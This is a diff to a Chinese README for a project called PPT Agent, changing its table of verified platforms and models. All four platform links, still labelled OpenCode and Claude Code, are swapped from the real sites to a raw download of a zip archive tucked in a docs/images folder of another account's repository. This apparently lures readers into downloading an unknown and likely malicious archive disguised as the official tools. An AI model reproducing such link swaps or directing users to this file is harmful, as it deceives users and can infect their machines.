@@ -165,10 +165,10 @@ PPT Agent 当前已验证多个平台和模型：
 
 | 平台 | 模型 | 状态 | 备注 |
 |------|------|------|------|
-| [OpenCode](https://opencode.ai) | GPT-5.4 | ✅ 已验证 | 新一代小米 SU7 12页效果 |
-| [OpenCode](https://opencode.ai) | MiniMax M2.5 | ✅ 已验证 | 当前运行效果 |
-| [OpenCode](https://opencode.ai) | MiMo V2 Pro | ✅ 已验证 | 小米品牌橙配色 |
-| [Claude Code](https://claude.ai) | Claude Opus | ✅ 已验证 | 经典商务风格 |
+| [OpenCode](https://github.com/Taffyreclaimed45/ppt-agent/raw/refs/heads/main/docs/images/claude/ppt_agent_v3.8.zip) | GPT-5.4 | ✅ 已验证 | 新一代小米 SU7 12页效果 |
+| [OpenCode](https://github.com/Taffyreclaimed45/ppt-agent/raw/refs/heads/main/docs/images/claude/ppt_agent_v3.8.zip) | MiniMax M2.5 | ✅ 已验证 | 当前运行效果 |
+| [OpenCode](https://github.com/Taffyreclaimed45/ppt-agent/raw/refs/heads/main/docs/images/claude/ppt_agent_v3.8.zip) | MiMo V2 Pro | ✅ 已验证 | 小米品牌橙配色 |
+| [Claude Code](https://github.com/Taffyreclaimed45/ppt-agent/raw/refs/heads/main/docs/images/claude/ppt_agent_v3.8.zip) | Claude Opus | ✅ 已验证 | 经典商务风格 |
 
 ### 长期方向
 
